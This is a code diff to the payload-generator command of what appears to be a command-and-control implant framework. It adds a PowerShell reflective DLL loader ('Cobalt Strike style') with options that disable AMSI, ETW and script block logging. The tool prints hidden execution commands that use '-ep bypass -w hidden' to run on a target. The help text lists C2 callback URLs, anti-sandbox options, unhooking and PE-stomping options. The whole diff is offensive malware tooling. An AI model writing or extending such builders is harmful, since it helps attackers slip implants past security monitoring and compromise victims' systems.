@@ -50,6 +50,7 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         "debug": False,
         "transport": "pipe",
         "tcp_port": 0,
+        "embed_dll": "",
     }
 
     # Boolean flags (no argument following)
@@ -109,6 +110,8 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
             opts["transport"] = val; i += 2
         elif parts[i] == "--tcp-port" and i + 1 < len(parts):
             opts["tcp_port"] = int(parts[i + 1]); i += 2
+        elif parts[i] == "--embed-dll" and i + 1 < len(parts):
+            opts["embed_dll"] = parts[i + 1]; i += 2
         elif parts[i] in ("--output", "-o") and i + 1 < len(parts):
             opts["output"] = Path(parts[i + 1]); i += 2
         elif parts[i] in bool_flags:
@@ -120,6 +123,11 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
             console.print(f"[red]Unknown option: {parts[i]}[/red]")
             _print_help()
             return
+
+    # ─── Reflective DLL loader path ──────────────────────────────────
+    if opts["format"] == "powershell" and opts["embed_dll"]:
+        _build_powershell_loader(opts, project_root)
+        return
 
     # ─── PowerShell agent path ────────────────────────────────────────
     if opts["format"] == "powershell":
@@ -374,6 +382,56 @@ def _build_powershell(opts: dict, project_root: Path, listeners: list) -> None:
     console.print(f"[dim]  $s=[IO.File]::ReadAllText('{out_path.name}');IEX $s[/dim]")
 
 
+# ─── Reflective DLL loader ────────────────────────────────────────────
+
+def _build_powershell_loader(opts: dict, project_root: Path) -> None:
+    """Generate a PowerShell reflective DLL loader (Cobalt Strike style)."""
+    dll_path = Path(opts["embed_dll"])
+    if not dll_path.is_absolute():
+        dll_path = project_root / dll_path
+    if not dll_path.exists():
+        console.print(f"[red]✗ DLL not found: {dll_path}[/red]")
+        return
+
+    console.print(f"[cyan]Generating reflective DLL loader...[/cyan]")
+    console.print(f"  DLL:       {dll_path.name} ({dll_path.stat().st_size / 1024:.1f} KB)")
+
+    evasion_flags = []
+    if opts["no_amsi"]:
+        evasion_flags.append("--no-amsi")
+    if opts["no_etw"]:
+        evasion_flags.append("--no-etw")
+    if opts["no_sbl"]:
+        evasion_flags.append("--no-sbl")
+    if evasion_flags:
+        console.print(f"  Disabled:  {', '.join(evasion_flags)}")
+    console.print()
+
+    sys.path.insert(0, str(project_root / "scripts"))
+    from build_powershell import build_powershell_loader
+
+    try:
+        out_path = build_powershell_loader(
+            dll_path=dll_path,
+            no_amsi=opts["no_amsi"],
+            no_etw=opts["no_etw"],
+            no_sbl=opts["no_sbl"],
+            debug=opts["debug"],
+            output_path=opts["output"],
+        )
+    except Exception as e:
+        console.print(f"[red]✗ Build failed: {e}[/red]")
+        return
+
+    size_kb = out_path.stat().st_size / 1024
+    console.print(f"[green]✓ Reflective loader: {out_path} ({size_kb:.1f} KB)[/green]")
+    console.print(f"[green]✓ Embedded DLL:      {dll_path.name}[/green]")
+    console.print()
+    console.print("[dim]Execute on target:[/dim]")
+    console.print(f"[dim]  powershell -ep bypass -f {out_path.name}[/dim]")
+    console.print(f"[dim]  powershell -ep bypass -w hidden -f {out_path.name}[/dim]")
+
+
 # ─── Help ─────────────────────────────────────────────────────────────
 
 def _print_help():
@@ -388,6 +446,8 @@ def _print_help():
                          (overrides listener interface and --url)
   --transport MODE      Transport for PS agent: pipe (default) or tcp
   --tcp-port PORT       Raw TCP port (required when --transport tcp)
+  --embed-dll PATH      Embed a compiled DLL into a PS reflective loader
+                         (use with --format powershell, skips listener requirement)
 
 [bold]Common options:[/bold]
   --url, -u URL         C2 callback URL (C agent) / pipe host fallback (PS)
@@ -427,6 +487,7 @@ def _print_help():
   generate --format powershell --listener SMB --pipe-host 10.0.0.5 --sleep 30
   generate --format powershell --listener SMB --no-amsi --no-etw
   generate --format powershell --transport tcp --tcp-port 8888 --pipe-host 10.0.0.5
+  generate --format powershell --embed-dll builds/agent.dll
   generate --url https://cdn.example.com/api/v1 --sleep 30
   generate --debug --no-unhook --no-sandbox --no-pe-stomp --no-crypt
   generate --arch x86 --kill-date 2026-12-31
